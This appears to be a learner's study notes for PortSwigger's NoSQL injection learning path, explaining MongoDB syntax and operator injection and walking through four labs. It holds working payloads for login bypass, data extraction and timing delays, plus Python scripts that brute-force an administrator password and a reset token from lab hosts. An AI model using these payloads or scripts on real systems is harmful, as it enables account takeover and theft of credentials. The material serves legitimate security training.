# NoSQL Injection — PortSwigger Web Security Academy

[🇮🇩 Read in Bahasa Indonesia](nosql-injection-id.md)

﷽

## What is that?

![nosql-injection](images/overview/nosql-injection.png)

This learning path covers the detection, exploitation, and prevention of NoSQL injection vulnerabilities. You'll explore the differences between NoSQL and SQL injection, learn how to perform NoSQL syntax injection, and how to use NoSQL operators to manipulate queries.

## What is NoSQL Injection?

NoSQL injection is a vulnerability where is able to interfere with the queries that an application makes to a NoSQL database. NoSQL injection may enable an attacker to:

- Bypass authentication or protection mechanisms.
- Extract or edit data.
- Cause a denial of service.
- Execute code on the server.

NoSQL databases store and retrieve data in a format other than traditional SQL relational tables. They use a wide range of query languanges instead of a universal standard like SQL, and have fewer relational constraints.

## Types of NoSQL Injection

There are two different types of NoSQL injection:

- Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languanges, types of query syntax, and different data structures.

- Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.

In this topic, we'll look at how to test for NoSQL vulnerabilities in general, then focus on

### NoSQL Syntax Injection

You can potentially detect NoSQL injection vulnerabilities by attemping to break the query syntax. To do this, systematically test each input by submitting fuzz strings and special characters that trigger a database error or some other detectable behaviour if they're adequately sanitized or filtered by the application.

If you know the API languange of the target database, use special characters and fuzz strings that are relevant to that languange. Otherwise, use a variety of fuzz strings to target multiple API languanges.

#### Detecting Syntax Injection in MongoDB

Consider a shopping application that displays products in different categories. When the user selects the *Fizzy drinks* category, their browser requests the following URL:

```url
https://insecure-website.com/product/lookup?category=fizzy
```
This causes the application to send a JSON query to retrieve relevant products from the `product` collection in the MongoDB database:

```sql
this.category == 'fizzy'
```
To the whether the input may be vulnerable, submit a fuzz string in the value of the `category` parameter. An example string for MongoDB is:

```sql
' "`{
;$Foo}
$Foo \xYZ
```
Use this fuzz string to construct the following attack:

```url
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
If this causes a change from original response, this may indicate that use input isn't filtered or sanitized correctly.

>Note: NoSQL injection vulnerabilities can occur in a variety of contexts, and you need to adapt your fuzz strings accordingly. Otherwise, you may simply trigger validation errors that mean the application never executes your query.

In this example, we're injecting the fuzz string via the URL, so the string is URL-encoded. In some applications, you may need to inject your payload would become
*'\"`{\r;$Foo}\n$Foo \\xYZ\u0000`*.

#### Determining Which Characters Are Processed

To determine which characters are interpreted as syntax by the application, you can inject individual characters. For example, you could submit `'`, which results in the following MongoDB query:

```sql
this.category == '''
```
If this causes a change from the original response, this may indicate that the `'` charater has broken the query syntax and caused a syntax error. You can confirm this by submitting a valid query string in the input, for example by escaping the quote:

```sql
this.category == '\''
```
If this doesnt't cause a syntax error, this may mean that the application is vulnerable to an injection attack.

#### Confirming Conditional Behavior

After detecting a vulnerability, the next step is to determine whether you can influence boolean conditions using NoSQL syntax.

To test this, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements `' && 0 && 'x` and `' && 1 && 'x` as follows:

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
```
```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```
If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.

#### Overriding Existing Conditions

Now that you have identified that you can influence boolean conditions, you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that alwayas evaluates to true, such as `'||'1'=='1`:
```url
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```
This results in the following MongoDB query:
```sql
this.category == 'fizzy'||'1'=='1'
```
As injected condition is always true, the modified query returns all items. This enables you to view all products in any category, including hidden or unknown categories.

> Warning: Take care when injecting a condition that always evaluates to true into a NoSQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If an application uses it when updating or deleting data, for example, this can result in accidental data loss.

#### Overriding Existing Conditions - Continued

You could also add a null character after the category value. MongoDB may ignore all characters after character. This means that any additional conditions on the MongoDB query are ignored. For example, the query may have an addtional `this.released` restriction:

```sql
this.category == 'fizzy' && this.released == 1
```
The restriction `this.released == 1` is used to only show products that are released. For unreleased products, presumably `this.released == 0`.

In this case, an attacker could construct an attack as follows:

```url
https://insecure-website.com/product/lookup?category=fizzy'%00
```
This results in the following NoSQL query:

```sql
this.category == 'fizzy'\u000' && this.released == 1
```
If MongoDB ignores all characters after the null character, this removes the requirement for the released field to be set to 1. As a result, all products in the `fizzy` category are displayed, including unreleased products.

##### Lab: Detecting NoSQL Injection

The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.

<details>
<summary>Lab details, screenshots & walkthrough 0.1</summary>

![Open labs 0.1](images/lab-0.1-detecting-nosql-injection/01-open-labs-0.1.png)

![Open parameter Gift 0.1](images/lab-0.1-detecting-nosql-injection/02-open-gift-parameter-0.1.png)

![Send to repeater 0.1](images/lab-0.1-detecting-nosql-injection/03-send-to-repeater-0.1.png)

![Test single quote 0.1](images/lab-0.1-detecting-nosql-injection/04-test-single-quote-0.1.png)

![Test '+' comment 0.1](images/lab-0.1-detecting-nosql-injection/05-test-plus-comment-0.1.png)

![use URL encode '+' 0.1](images/lab-0.1-detecting-nosql-injection/06-url-encode-plus-0.1.png)

![Testing false boolean condition 0.1](images/lab-0.1-detecting-nosql-injection/07-false-boolean-condition-0.1.png)

![URL encode payload 0.1](images/lab-0.1-detecting-nosql-injection/08-url-encode-payload-0.1.png)

![Result true boolean condition 0.1](images/lab-0.1-detecting-nosql-injection/09-true-boolean-condition-0.1.png)

![Try always-true payload ||1|| 0.1](images/lab-0.1-detecting-nosql-injection/10-always-true-payload-0.1.png)

![Open response in browser 0.1](images/lab-0.1-detecting-nosql-injection/11-open-response-in-browser-0.1.png)

![Copy response URL to browser 0.1](images/lab-0.1-detecting-nosql-injection/12-copy-response-url-0.1.png)

![Success finish labs 0.1](images/lab-0.1-detecting-nosql-injection/13-lab-solved-0.1.png)

##### Tutorial

1. First open parameter Gifts send to repeater
2. Try input single quote `'`, make sure respone have a error output
3. Try input `'+'` for commenting , if error respone change or convert to URL encoding `'%2b'` make sure to get normal back page.
4. Give boolean conditions:
```sql
' && 0 && 'x # true
' && 1 && 'x # false
```
5. If error respone output because payloads sql not parsing code JS error give change or convert to URL encoding:
```url
'+%26%26+0+%26%26+'x
'+%26%26+1+%26%26+'x 
```
6. Try to boolean conditions:
```sql
'||1||'
```
7. Success finish labs

##### Reference

<details>
<summary> Portswigger - NoSQL injection - Lab #1 Detecting NoSQL injection — Popo Hack</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=Z1eaH0zi7mk
Purpose: Hello Hackers, in this video of Detecting NoSQL injection you will see how to exploit and discover NoSQL injection vulnerabilities in a lab from Web Security Academy powered by Portswigger 
</details>

</details>

### NoSQL Operator Injection

NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query results. Examples of MongoDB query operators include:

- `$where` - Matches documents that satisfy a JavaScript expression.
- `$ne` - Matches all values that are not equal to a specified value.
- `$in` - Matches all of the values specified in an array.
- `$regex` - Selects documents where values match a specified regular expression.

You may be able to inject query operators to manipulate NoSQL queries. To do this, systematically submit different operators into a range of user inputs, then review the responses for error messages or other changes.

#### Submitting Query Operators

In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.

For URL-based inputs, you can insert query operators via URL parameters, For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following:

1. Convert the request method from `GET` to `POST`.
2. Change the `Content-Type` header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators in the JSON.

>Note: You can use the Content Type Converter extension to automatically convert the request method and change a URL-encoded `POST` request to JSON.

#### Detecting Operator Injection in MongoDB

Consider a vulnerable application that accepts a username and password in the body of a `POST` request:

```json
{"username":"wiener", "password":"peter"}
```
Test each input with a range of operators. For example, to test whether the username input processes the query operator, you could try the following injection.

```json
{"username":{"$ne":"invalid"},"password":"peter"}
```
If the `$ne` operator is applied, this queries all users where the username is not equal to `invalid`.

If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```
This query returns all login credentials where both the username and password are not equal to `invalid`. As result, you're logged into the application as the first user in the collection.

To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example:

```json
{"username":{"$in":["admin","administrator","superadmin]},"password":{$ne":""}}
```

##### Lab: Exploiting NoSQL Operator Injection to Bypass Authentication

The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.

<details>
<summary>Lab details, screenshots & walkthrough 0.2</summary>

To solve the lab, log into the application as the `administrator` user. You can log in to your own account using the following credentials `wiener:peter`.

![Open labs 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/01-open-labs-0.2.png)

![Login as wiener:peter 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/02-login-as-wiener-0.2.png)

![Send login request to repeater 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/03-send-login-to-repeater-0.2.png)

![Response location shows wiener 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/04-response-location-wiener-0.2.png)

![Inject $regex w and $ne to match wiener 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/05-regex-w-ne-returns-wiener-0.2.png)

![Inject $regex a returns unexpected number of records 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/06-regex-a-unexpected-records-0.2.png)

![Inject $regex ad returns administrator account 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/07-regex-ad-returns-admin-0.2.png)

![Response redirect used to access admin session 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/08-response-redirect-admin-0.2.png)

![Open response in browser 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/09-open-response-in-browser-0.2.png)

![Successfully logged in as administrator 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/10-lab-solved-admin-login-0.2.png)

##### Tutorial

1. First go to /login and login as `wiener` user, and http history collect send to repeater.
2. In request username and password give as value parameters JSON.
```json
{
    "username":"wiener",
    "password":"peter"
}
```
3. Try to give a value determine bypass authentication use operators `regex` (for) and `ne` MongoDB.

```json
{
    "username":{"$regex":"w"}, # regex operator search value match "w" found as "wiener"
    "password":{"$ne":""}
}
{
    "username":{"$regex":"ad"}, # regex operator search value match "a" found as "admin"
    "password":{"$ne":""}
}
```
4. Show respone in browser.
5. Success login use session administrator from bypass authentication.

##### Reference

<details>
<summary> Portswigger - NoSQL injection - Lab #2 Exploiting NoSQL operator injection to bypass authentication — Popo Hack</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=KaCUvVIOXvE
Purpose: Hello Hackers, in this video of Exploiting NoSQL operator injection to bypass authentication you will see how to exploit and discover NoSQL injection vulnerabilities in a lab from Web Security Academy powered by Portswigger 
</details>

</details>

### Exploiting Syntax Injection to Extract Data

In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from database.

#### Exfiltrating Data in MongoDB

Consider a vulnerable application that allows users to look up other registered usernames and displays their role. This triggers a request to the URL:

```url
https://insecure-website.com/user/lookup?username=admin
```
This results in the following NoSQL query of the `users` collection:

```JavaScript
{"$where":"this.username == 'admin'"}
```
As the query the `$where` operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:

```JavaScript
admin' && this.password[0] == 'a' || 'a'=='b
```
This returns the first character of the user's password string, enabling you to extract the password character by character. You could also use the JavaScript `match()` fuction to extract information. For example, the following payload enables you to identify whether the password contains digits:

```JavaScript
admin' && this.password.match(/\d) || 'a'=='b
```

#### Identifying Field Names

Because MongoDB handles semi-structed data that doesn't require a fixed schema, you may need to identify valid fields in the collection before you can extract data using JavaScript injection.

For example, to identify whether the MongoDB database contains a `password` field, you could submit the following payload:

```url
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

Send the payload again for an existing field and for a field that doens't exist. In this example, you know that the `username` field exists, so you could send the following payloads:

```JavaScript
admin' && this.username!='
admin' && this.foo!='
```
If the `password` field exists, you'd expect the response to be identical to the response for the existing field (`username`), but different to the response for the field that doesn't exist (`foo`).

#### Identifying Field Names - Continued

If you want to test different field names, you could perform a dictionary attack, by using a wordlist to cycle through potential field names.

>Note: You can alternatively NoSQL operator injection to extract field names character by character. This enables you to identify field names without having to guess or perform a dictionary attack. We'll teach you how to do this in the next section.

##### Lab: Exploiting NoSQL Injection to Extract Data

The user lookup functionality for this lab is powered by a MongoDB noSQL database. It is vulnerable to NoSQL injection.

<details>
<summary>Lab details, screenshots & walkthrough 0.3</summary>

To solve the lab, extract the password for the `administrator` user, then log in to their account. You can log in to your own account using the following credentials `wiener:peter`.

>Note: The password only uses lowercase letters.

![Open lab 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/01-open-lab-0.3.png)

![Login as wiener and open My Account 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/02-login-wiener-my-account-0.3.png)

![User lookup request for wiener 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/03-user-lookup-wiener-request-0.3.png)

![Lookup administrator returns user details 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/04-lookup-administrator-response-0.3.png)

![Single quote injection causes error 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/05-single-quote-error-0.3.png)

![URL-encoded plus restores valid response 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/06-url-encoded-plus-bypass-0.3.png)

![False boolean condition returns no user 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/07-false-boolean-condition-0.3.png)

![True boolean condition returns administrator 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/08-true-boolean-condition-0.3.png)

![Test password length greater than 1 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/09-password-length-greater-than-1-0.3.png)

![Intruder setup for password length testing 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/10-intruder-password-length-setup-0.3.png)

![Intruder results identify password length 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/11-intruder-password-length-results-0.3.png)

![Password length match response 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/12-password-length-match-response-0.3.png)

![Password length mismatch response 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/13-password-length-no-match-response-0.3.png)

![Test password character at index 0 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/14-test-password-char-index-0-0.3.png)

![Cluster bomb positions for character extraction 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/15-cluster-bomb-positions-0.3.png)

![Cluster bomb charset payload list 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/16-cluster-bomb-charset-payload-0.3.png)

![Select cluster bomb attack type 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/17-select-cluster-bomb-attack-0.3.png)

![Python extraction script 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/18-python-extraction-script-0.3.png)

![Python extraction script (continued) 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/19-python-extraction-script-part-2-0.3.png)

![Python script output extracts password 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/20-python-script-output-password-0.3.png)

![Intruder results for character extraction 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/21-intruder-char-extraction-results-0.3.png)

![Login as administrator 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/22-login-as-administrator-0.3.png)

![Lab solved as administrator 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/23-lab-solved-administrator-0.3.png)

##### Tutorial

Login wiener:peter search parameter user lookup, change to administrator too see leak respone information

```JavaScript
administrator' # first input single quote to see behaviour
administrator'%2b' # test input [+] why %2b because URL encoded for browser
administrator'+%26%26+'1'%3d%3d'2 # test false condition 1=2
administrator'+%26%26+'2'%3d%3d'2 # test true condtion 2=2
administrator'+%26%26+this.password.length+>+1+||+'a'%3d%3d'b # Check password length > 1
administrator'+%26%26+this.password.length+>+7+||+'a'%3d%3d'b # Success get length password > 7 
administrator'+%26%26+this.password.length+>+8+||+'a'%3d%3d'b # output length password not found because lenght password 1-7 (8 error not detect)
administrator'+%26%26+this.password[0]%3d%3d'w # test bruteforce password use string a-z get w in 0 positions
administrator'+%26%26+this.password[1]%3d%3d'l # test bruteforce password use string a-z get l in 1 positions
administrator'+%26%26+this.password[2]%3d%3d'n # test bruteforce password use string a-z get n in 2 positions
administrator'+%26%26+this.password[3]%3d%3d'p # test bruteforce password use string a-z get p in 3 positions
administrator'+%26%26+this.password[4]%3d%3d'q # test bruteforce password use string a-z get q in 4 positions
administrator'+%26%26+this.password[5]%3d%3d'p # test bruteforce password use string a-z get p in 5 positions
administrator'+%26%26+this.password[6]%3d%3d'h # test bruteforce password use string a-z get h in 6 positions
administrator'+%26%26+this.password[7]%3d%3d'm # test bruteforce password use string a-z get m in 7 positions
administrator'+%26%26+this.password[8]%3d%3d'a # output users and password not found
```

Try python code simple why because intruder so slow bruteforce cluster bom attack.

```python

import requests
import string
import urllib.parse

URL = "https://0aa3005c03c734b880a20d92003c00a6.web-security-academy.net/user/lookup"

COOKIES = {
    "session": "Fi366QGOq8168ec11A8dD0nyBWZEpC4a"
}

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*"
}

CHARSET = string.ascii_lowercase + string.digits

def check(payload):
    response = requests.get(
        URL,
        params={"user": payload},
        cookies=COOKIES,
        headers=HEADERS
    )
    return response.status_code == 200 and "administrator" in response.text

def extract_password():
    password = ""

    for length in range(1, 65):
        payload = f"administrator' && this.password.length == {length} || 'a'=='b"

        if check(payload):
            print(f"[+] Password length: {length}")
            break
    else:
        print("[-] Password length not found")
        return

    for index in range(length):
        for char in CHARSET:
            payload = (
                f"administrator' && "
                f"this.password[{index}] == '{char}' || 'a'=='b"
            )

            if check(payload):
                password += char
                print(f"[+] {index}: {char} | {password}")
                break
        else:
            print(f"[-] Character at index {index} not found")
            return

    print(f"\n[+] Password: {password}")

if __name__ == "__main__":
    extract_password()
```
```bash
printf '%s\n' {a..z} {A..Z} {1..9} > charset.txt
```

You can check to in intruder results

```text
177	0	w	200	175	false	false	209	
90	1	l	200	176	false	false	209	
107	2	n	200	307	false	false	209	
124	3	p	200	175	false	false	209	
133	4	q	200	174	false	false	209	
126	5	p	200	174	false	false	209	
63	6	h	200	175	false	false	209	
104	7	m	200	175	false	false	209	
```

success login as administrator~wlnpqphm

##### Reference

<details>
<summary> Portswigger - NoSQL injection - Lab #3 Exploiting NoSQL injection to extract data — Popo Hack</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=tyRjEuj8sf4
Purpose: Hello Hackers, in this video of Exploiting NoSQL injection to extract data you will see how to exploit and discover NoSQL injection vulnerabilities in a lab from Web Security Academy powered by Portswigger 
</details>

</details>

### Exploiting NoSQL Operator Injection to Extract Data

Even if the original query doesn't use any operators that enable you to run arbitrary JavaScript, you may be able to inject one of these operators yourself. You can then use boolean conditions to determine whether the application executes any JavaScript that you inject via this operator.

#### Injecting Operators in MongoDB

Consider a vulnerable application that accepts username and password in the body of a `POST` request:

```json
{
    "username":"wiener,
    "password":"peter"
}
```
To test whether you can inject operators, you could try adding the `$where` operator as an additional parameter, then send one request where condition evaluates to false, and another that evaluates to true, For example:

```json
{
    "username":"wiener",
    "password":"peter",
    "$where":"1"
}
```
#### Extracting Field Names

If you have injected an operator that enables you to run JavaScript, you may be able to use the `keys()` method to extract the name of data fields. For example, you could submit the following payload:

```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```
This inspects the first data field in the user object and returns the first character of the field name. This enables you to extract the field name character by character.

#### Exfiltrating Data Using Operators

Alternatively, you may be able to extract data using operators that don't enable you to run JavaScript. For example, you may be able to use the `$regex` operator to extract data character by character.

Consider a vulnerable application that accepts a username and password in the body of a `POST` request. For example:

```json
{
    "username":"myuser",
    "password":"mypass"
}
```
You could start by testing whether the `$regex` operator is processed as follows:

```json
{
    "username":"admin",
    "password":{"$regex":"^.*"}}
}
```
If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the `$regex` operator to extract data character by character. For example, the following payload checks whether the password begins with an `a`:

```json
{
    "username":"admin",
    "password":{"$regex":"^a.*"}}
}
```

##### Lab: Exploiting NoSQL Operator Injection to Extract Unknown Fields

The user lookup fuctionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

<details>
<summary>Lab details, screenshots & walkthrough 0.4</summary>

To solve the lab, log in as `carlos`

>Tip: To solve the lab, you'll first need to exfiltrate the value of the password reset token for the user `carlos`.

![Open lab 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/01-open-lab-0.4.png)

![Send login request for carlos in Repeater (invalid password) 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/02-send-login-carlos-repeater-0.4.png)

![Inject $ne password and $where false condition returns invalid credentials 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/03-where-false-invalid-credentials-0.4.png)

![Inject $where true condition triggers account locked response 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/04-where-true-account-locked-0.4.png)

![Open forgot password page and submit carlos 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/05-forgot-password-carlos-0.4.png)

![Password reset email confirmation 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/06-reset-email-confirmation-0.4.png)

![Enumerate object keys and extract changePwd token value 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/07-enumerate-keys-extract-changepwd-token-0.4.png)

![Use extracted changePwd token in forgot-password request 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/08-use-changepwd-token-forgot-password-0.4.png)

![Set new password for carlos 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/09-set-new-password-carlos-0.4.png)

![Login as carlos with new password 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/10-login-carlos-new-password-0.4.png)

![Lab solved as carlos 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/11-lab-solved-carlos-0.4.png)

##### Tutorial

1. Open my account testing send repeater to login carlos with parameter username:password and send request to see wrong password.
2. Try input operator "$ne":"" in password form and see request to see respone

```json
{"username":"carlos","password":{"$ne": "test"},"$where":"0"}
{"username":"carlos","password":{"$ne": "test"},"$where":"1"}
{"username":"carlos","password":{"$ne": "test"},"$where":"Object.keys(this)[1].match('^.{0}a.*')"}
```
3. Bruteforce to see valid object and get hidden keys

```json
{"username":"carlos","password":{"$ne": "test"},"$where":"Object.keys(this)[1].match('^.{0}a.*')"}
```

```python
#!/usr/bin/env python3
import re
import string
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://0a15008a04a7e85680728a1d00400087.web-security-academy.net/login"
COOKIE = {"session": "Jdhkvf2nza8PiGWgmb9kaPBEsZju55Vj"}
CHARSET = string.ascii_letters + string.digits + "_-"

def is_true(r):
    if r.status_code in (301, 302, 303, 307, 308):
        return True
    return "invalid username or password" not in r.text.lower()

s = requests.Session()
s.verify = False
s.headers.update({"Content-Type": "application/json"})
s.cookies.update(COOKIE)

for idx in range(6):
    name = ""
    for pos in range(30):
        hit = None
        for ch in CHARSET:
            payload = {
                "username": "carlos",
                "password": {"$ne": "test"},
                "$where": f"Object.keys(this)[{idx}].match('^.{{{pos}}}{re.escape(ch)}.*')",
            }
            if is_true(s.post(URL, json=payload, allow_redirects=False, timeout=10)):
                hit = ch
                name += ch
                print(f"\rkey[{idx}] = {name}", end="", flush=True)
                break
        if not hit:
            break
    print(f"\rkey[{idx}] = {name or '-'}")
```

4. If success get hidden object keys, try bruteforce again and extract hidden object keys to get hash length and token

```json
{"username":"carlos","password":{"$ne": "test"},"$where":"this.changePwd.match('^.{0}a.*')"}
```

```python
#!/usr/bin/env python3
import re
import string
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://0a15008a04a7e85680728a1d00400087.web-security-academy.net/login"
COOKIE = {"session": "Jdhkvf2nza8PiGWgmb9kaPBEsZju55Vj"}
FIELD = "changePwd"
CHARSET = string.ascii_letters + string.digits

def is_true(r):
    if r.status_code in (301, 302, 303, 307, 308):
        return True
    return "invalid username or password" not in r.text.lower()

s = requests.Session()
s.verify = False
s.headers.update({"Content-Type": "application/json"})
s.cookies.update(COOKIE)

# length
length = None
for i in range(1, 51):
    payload = {
        "username": "carlos",
        "password": {"$ne": "test"},
        "$where": f"this.{FIELD}.match('^.{{{i}}}$')",
    }
    if is_true(s.post(URL, json=payload, allow_redirects=False, timeout=10)):
        length = i
        break
print(f"length = {length}")

if not length:
    exit(1)

# value
val = ""
for pos in range(length):
    for ch in CHARSET:
        payload = {
            "username": "carlos",
            "password": {"$ne": "test"},
            "$where": f"this.{FIELD}.match('^.{{{pos}}}{re.escape(ch)}.*')",
        }
        if is_true(s.post(URL, json=payload, allow_redirects=False, timeout=10)):
            val += ch
            print(f"\r{FIELD} = {val}", end="", flush=True)
            break
    else:
        val += "?"
print(f"\n{FIELD} = {val}")
```
5. Try craft /forgot-password?hiddenkeys=hidden token
11. If success try change password
12. Try Login username with new password carlos
13. Success login users carlos

##### Reference

<details>
<summary> Portswigger - NoSQL injection - Lab #4 Exploiting NoSQL operator injection to extract unknown field — Popo Hack</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=tyRjEuj8sf4
Purpose: Hello Hackers, in this video of Exploiting NoSQL injection to extract data you will see how to exploit and discover NoSQL injection vulnerabilities in a lab from Web Security Academy powered by Portswigger 
</details>

</details>

### Timing Based Injection

Sometimes triggering a database error doesn't cause a difference in the application's response. In this situation, you may still be able to detect and exploit the vulnerability by using JavaScript injection to trigger a conditional time delay.

To conduct timing-based NoSQL injection:

![Wait response sleep(5000)](images/time-based/01-wait-response-sleep-5000.png)

![Response output with ~5 second delay (5184 ms)](images/time-based/02-response-delay-5184ms.png)

1. Load the page several times to determine a baseline loading time.
2. Insert a timing based payload into the input. A timing based payload causes an intentional delay in the response when executed. For example, `{"$where":"sleep(5000)"} causes an intentional delay of 5000 ms on successfull injection.
3. Identify whether the response loads will trigger a time delay if password beings with the letter `a`:

```json
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

### Preventing NoSQL Injection

The appropriate way to prevent NoSQL injection attaacks depends on the specific NoSQL technology in use. As such, we recomend reading the security documentation for your NoSQL database of choice. That said, the following broad guidelines will also help:

- Sanitize and validate user input, using an allowlist of accepted characters.
- Insert user input using parameterized queries instead of concatenating user input directly into the query.
- To prevent operator injection, apply an allowlist of accepted keys.

## Well done! You've completed NoSQL injection.

**NoSQL Injection (NoSQLi)**

This learning path introduces NoSQL Injection (NoSQLi), a web security vulnerability that affects applications using NoSQL databases. You have learned how to detect and exploit NoSQL Injection to bypass authentication, extract hidden data, manipulate application behavior, and understand essential techniques for securing applications against NoSQLi attacks.

[PortSwigger – NoSQL Injection Learning Path](https://portswigger.net/web-security/learning-paths/nosql-injection/)

**Status:** Completed ✓